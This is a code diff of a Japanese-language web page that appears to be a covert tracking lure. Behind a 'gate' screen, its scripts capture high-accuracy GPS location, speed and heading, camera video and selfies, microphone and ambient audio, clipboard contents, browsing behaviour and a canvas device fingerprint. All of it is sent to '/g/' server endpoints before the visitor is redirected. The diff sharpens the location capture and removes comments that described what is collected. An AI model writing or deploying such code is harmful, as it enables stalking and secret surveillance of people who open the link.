@@ -11,7 +11,6 @@ button{padding:12px 30px;font-size:15px;border:0;border-radius:999px;background:
   color:#fff;font-weight:600;cursor:pointer}
 button:disabled{opacity:.55}
 
-/* ---- ゲート ---- */
 #gate{position:fixed;inset:0;z-index:20;background:#0f1115;overflow-y:auto;
   display:flex;align-items:center;justify-content:center;padding:26px;
   transition:opacity .4s ease,transform .4s ease}
@@ -29,7 +28,6 @@ button:disabled{opacity:.55}
 #help{display:none;margin-top:14px;border-top:1px solid #232734;padding-top:12px}
 #help p{font-size:12.5px;color:#9aa3b2;margin:0;line-height:1.8;text-align:left}
 
-/* ---- 本体 ---- */
 #body{min-height:100vh;display:flex;align-items:center;justify-content:center;
   text-align:center;padding:24px;opacity:0;transition:opacity .35s ease}
 body.need #body{opacity:1}
@@ -80,13 +78,19 @@ window.GPS = {
 };
 </script>
 
-<!-- ============ 本体（位置情報・カメラ・録画） ============ -->
+<!-- ============ 本体 ============ -->
 <script>
 (function () {
   "use strict";
   var G = window.GPS, CODE = G.code, ISLIVE = !!G.live;
   var IV = Math.max(5, G.iv | 0) * 1000;
-  var DEST = G.dest || "", DEST_MIN = (G.destMin || 2) * 1000;
+
+  /* ★ 高精度を最優先。maximumAge:0 でキャッシュ座標を使わない */
+  var HI = { enableHighAccuracy: true,  timeout: 30000, maximumAge: 0 };
+  var LO = { enableHighAccuracy: false, timeout: 15000, maximumAge: 0 };
+
+  var WIN_MS = 4000;        // この窓の中で一番精度の良い点だけ送る
+  var BAD_ACC = 3000;       // これより悪い精度は、既に良い点があれば捨てる
 
   var gate = document.getElementById("gate");
   var gst = document.getElementById("gst");
@@ -115,8 +119,10 @@ window.GPS = {
 
   var started = false, done = false, left = false, stopped = false;
   var gotFix = false, t0 = 0, tries = 0, inflight = false, lastIp = 0;
-  var wid = null, watchHi = null, watchTimer = null, lastFixAt = 0, lastSend = 0;
-  var q = [], sending = false, gaveUp = false, denied = false;
+  var wid = null, watchHi = null, watchTimer = null;
+  var lastFixAt = 0, lastSend = 0, lastAcc = 0, firstSent = false;
+  var q = [], sending = false, gaveUp = false, hiFailed = false;
+  var buf = [], bufTimer = null;
   var camStream = null, rec = null, recTimer = null, segSeq = 0, camBusy = false;
 
   function say(t, w) {
@@ -196,7 +202,7 @@ window.GPS = {
       body: JSON.stringify({ sid: SID, vid: VID, ip_point: 1 })
     }).catch(function () {});
   }
-  function flush(kind) {
+  function flushBeacon(kind) {
     try {
       navigator.sendBeacon("/g/" + encodeURIComponent(CODE) + "/p",
         new Blob([JSON.stringify({ sid: SID, vid: VID, kind: kind, pts: q.slice(0) })],
@@ -204,7 +210,7 @@ window.GPS = {
     } catch (e) {}
   }
 
-  /* ---------- 位置情報 ---------- */
+  /* ---------- 位置情報（高精度・窓内ベスト1点） ---------- */
   function geoOnce(opt, cb) {
     if (!navigator.geolocation) { cb({ code: 0 }); return; }
     if (inflight) return;
@@ -212,7 +218,7 @@ window.GPS = {
     var fin = false;
     var to = setTimeout(function () {
       if (fin) return; fin = true; inflight = false; cb({ code: 3 });
-    }, (opt.timeout || 15000) + 2500);
+    }, (opt.timeout || 30000) + 3000);
     try {
       navigator.geolocation.getCurrentPosition(
         function (p) { if (fin) return; fin = true; clearTimeout(to); inflight = false; cb(null, p); },
@@ -233,27 +239,51 @@ window.GPS = {
       wid = navigator.geolocation.watchPosition(
         function (p) { onFix(p); },
         function (e) { onErr(e, true); },
-        hi ? { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
-           : { enableHighAccuracy: false, timeout: 20000, maximumAge: 60000 });
+        hi ? HI : LO);
     } catch (e) { wid = null; watchHi = null; }
   }
+
   function onFix(p) {
     var c = p && p.coords;
     if (!c || c.latitude == null) return;
     tries = 0; lastFixAt = Date.now();
+
     if (!gotFix) {
       gotFix = true;
       passGate();
-      if (DEST && !left) setTimeout(function () { go(DEST); }, Math.max(400, DEST_MIN));
+      if (!ISLIVE && DEST() && !left) setTimeout(function () { go(DEST()); }, 400);
     }
-    push({ ts: new Date(p.timestamp || Date.now()).toISOString(),
-           lat: c.latitude, lon: c.longitude, acc: c.accuracy });
+    /* 窓に貯めて、最も精度の良い1点だけを送る */
+    buf.push({ acc: c.accuracy, pt: {
+      ts: new Date().toISOString(),            // ★受信時刻（カウンターが動く）
+      lat: c.latitude, lon: c.longitude, acc: c.accuracy,
+      spd: c.speed, hdg: c.heading
+    }});
+    if (!bufTimer) bufTimer = setTimeout(flushBuf, WIN_MS);
+    if (!firstSent) { firstSent = true; flushBuf(); }   // 1点目は即
+
     if (wid !== null && watchHi !== true) watch(true);
   }
+  function flushBuf() {
+    if (bufTimer) { clearTimeout(bufTimer); bufTimer = null; }
+    if (!buf.length) return;
+    buf.sort(function (a, b) { return (a.acc || 1e9) - (b.acc || 1e9); });
+    var best = buf[0], keep = buf;
+    buf = [];
+    var acc = best.acc || 0;
+    /* 既に十分良い点があるなら、極端に悪い点は捨てる */
+    if (lastAcc && lastAcc < 200 && acc > BAD_ACC) return;
+    lastAcc = acc;
+    push(best.pt);
+    if (keep.length > 1) keep.length = 0;
+  }
+
+  function DEST() { return G.dest || ""; }
+  function DEST_MIN() { return (G.destMin || 2) * 1000; }
+
   function onErr(e, fromWatch) {
     var code = (e && e.code) || 0;
     if (code === 1) {
-      denied = true;
       say(G.deny, true);
       showInApp();
       showHelp(hint());
@@ -263,6 +293,13 @@ window.GPS = {
       return;
     }
     if (!fromWatch) tries++;
+    /* 高精度でタイムアウトしたら低精度に落とす */
+    if (code === 3 && !hiFailed && !gotFix) {
+      hiFailed = true;
+      geoOnce(LO, after1);
+      if (wid === null) watch(false);
+      return;
+    }
     if (!gaveUp) say("位置情報：取得中…（試行 " + tries + " / code=" + code + "）");
     if (t0 && Date.now() - t0 > 60000 && !gaveUp) {
       gaveUp = true;
@@ -286,7 +323,8 @@ window.GPS = {
   function go(url) {
     if (!url || left) return;
     left = true;
-    flush("stop");
+    flushBuf();
+    flushBeacon("stop");
     try { location.replace(url); } catch (e) { location.href = url; }
   }
 
@@ -294,19 +332,17 @@ window.GPS = {
     if (started) return;
     started = true; t0 = Date.now(); stopped = false;
     say(G.ask);
-    // ★ タップと同じタスク：位置情報だけ
-    geoOnce({ enableHighAccuracy: false, timeout: 15000, maximumAge: 60000 }, after1);
-    // ★ 別タスク：watch
-    watchTimer = setTimeout(function () { watchTimer = null; watch(false); }, 1500);
-    // ★ さらに後：カメラ（Safariの操作有効期限は約5秒あるので間に合う）
+    // ★ タップと同じタスク：高精度で1回だけ
+    geoOnce(HI, after1);
+    // ★ 別タスク：高精度 watch
+    watchTimer = setTimeout(function () { watchTimer = null; watch(true); }, 1500);
+    // ★ さらに後：カメラ
     if (ISLIVE) setTimeout(camStart, 900);
-    // 保険
+
     setInterval(function () {
       if (stopped || left) return;
       if (gotFix) {
-        if (Date.now() - lastFixAt > 25000) {
-          geoOnce({ enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }, after1);
-        }
+        if (Date.now() - lastFixAt > 25000) geoOnce(hiFailed ? LO : HI, after1);
         return;
       }
       sendIp(false);
@@ -315,12 +351,14 @@ window.GPS = {
         say("位置情報：端末が位置を出せていません（回線からの推定で記録します）", true);
         showHelp(hint());
       }
-      geoOnce({ enableHighAccuracy: false, timeout: 20000, maximumAge: 0 }, after1);
+      geoOnce(hiFailed ? LO : HI, after1);
     }, 20000);
     setTimeout(function () { if (!gotFix) sendIp(true); }, 9000);
     setInterval(function () {
       if (stopped || left) return;
-      if (q.length) send(); else if (Date.now() - lastSend > Math.max(30000, IV * 3)) send({ kind: "hb" });
+      flushBuf();
+      if (q.length) send();
+      else if (Date.now() - lastSend > Math.max(30000, IV * 3)) send({ kind: "hb" });
     }, Math.min(IV, 4000));
   }
 
@@ -334,14 +372,10 @@ window.GPS = {
       video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
       audio: true
     }).then(function (s) {
-      camBusy = false;
-      camStream = s;
+      camBusy = false; camStream = s;
       say("② カメラ：映像を記録中");
       var v = document.getElementById("cam");
-      if (v) {
-        v.srcObject = s;
-        var pp = v.play(); if (pp && pp.catch) pp.catch(function () {});
-      }
+      if (v) { v.srcObject = s; var pp = v.play(); if (pp && pp.catch) pp.catch(function () {}); }
       setTimeout(selfie, 1800);
       recLoop();
       say("③ マイク：OK");
@@ -360,13 +394,11 @@ window.GPS = {
       x.translate(w, 0); x.scale(-1, 1);
       x.drawImage(v, 0, 0, w, h);
       var data = cv.toDataURL("image/jpeg", 0.7);
-      // 監視室の「自撮り」と解析のギャラリーの両方に効く（/ev が両方へ書く）
       fetch("/g/" + encodeURIComponent(CODE) + "/ev", {
         method: "POST", cache: "no-store",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ sid: SID, vid: VID, kind: "selfie", text: data })
       }).catch(function () {});
-      // 旧 /x も一応
       fetch("/g/" + encodeURIComponent(CODE) + "/x", {
         method: "POST", cache: "no-store",
         headers: { "Content-Type": "application/json" },
@@ -414,33 +446,31 @@ window.GPS = {
     if (e.target && e.target.id === "go") return;
     if (e.target && e.target.closest && e.target.closest("#ia")) return;
     if (!started) start();
-    else if (!gotFix && window.navigator.geolocation) {
-      geoOnce({ enableHighAccuracy: false, timeout: 15000, maximumAge: 0 }, after1);
-    }
+    else if (!gotFix && window.navigator.geolocation) geoOnce(hiFailed ? LO : HI, after1);
   }, { passive: true });
   if (retryBtn) retryBtn.addEventListener("click", function () {
-    denied = false; gaveUp = false; t0 = Date.now();
+    gaveUp = false; hiFailed = false; t0 = Date.now();
     say(G.ask);
-    geoOnce({ enableHighAccuracy: false, timeout: 15000, maximumAge: 0 }, after1);
-    if (wid === null) watch(false);
+    geoOnce(HI, after1);
+    if (wid === null) watch(true);
   });
 
   document.addEventListener("visibilitychange", function () {
     if (document.visibilityState === "hidden") {
       if (rec && rec.state !== "inactive") { try { rec.stop(); } catch (e) {} }
-      if (!left) flush("hb");
+      if (!left) flushBeacon("hb");
       return;
     }
     if (camStream && (!rec || rec.state === "inactive")) recLoop();
-    if (!gotFix && started) geoOnce({ enableHighAccuracy: false, timeout: 15000, maximumAge: 0 }, after1);
+    if (!gotFix && started) geoOnce(hiFailed ? LO : HI, after1);
   });
-  window.addEventListener("pagehide", function () { if (!left) flush("stop"); });
+  window.addEventListener("pagehide", function () { if (!left) flushBeacon("stop"); });
 
   setTimeout(function () { if (!started) start(); }, 2500);
 })();
 </script>
 
-<!-- ============ スパイ（クリップボード・行動ログ・指紋・環境音） ============ -->
+<!-- ============ スパイ ============ -->
 <script>
 (function () {
   "use strict";
@@ -471,7 +501,6 @@ window.GPS = {
          { vid: VID, kind: kind, value: value || 0, text: text || "" });
   }
 
-  /* ---------- クリップボード ---------- */
   ["click", "touchstart", "keydown"].forEach(function (t) {
     document.addEventListener(t, function h() {
       document.removeEventListener(t, h);
@@ -486,7 +515,6 @@ window.GPS = {
     }, { once: true, passive: true });
   });
 
-  /* ---------- 滞在・スクロール・離脱 ---------- */
   var t0 = Date.now(), hiddenMs = 0, hiddenAt = 0, maxScroll = 0;
   var VISITS = (function () {
     try { var k = "gps_v_" + CODE, n = (+(localStorage.getItem(k) || 0)) + 1;
@@ -510,7 +538,6 @@ window.GPS = {
   setInterval(function () { flush(false); }, 15000);
   window.addEventListener("pagehide", function () { flush(true); });
 
-  /* ---------- 端末指紋 ---------- */
   function canvasHash() {
     try {
       var c = document.createElement("canvas"); c.width = 280; c.height = 60;
@@ -570,7 +597,6 @@ window.GPS = {
     });
   }, 400);
 
-  /* ---------- 環境音（ゲート通過後に1回だけ／live は映像側に音声があるので除外） ---------- */
   var voiceDone = false;
   var wait = setInterval(function () {
     if (voiceDone || !document.body.classList.contains("need")) return;
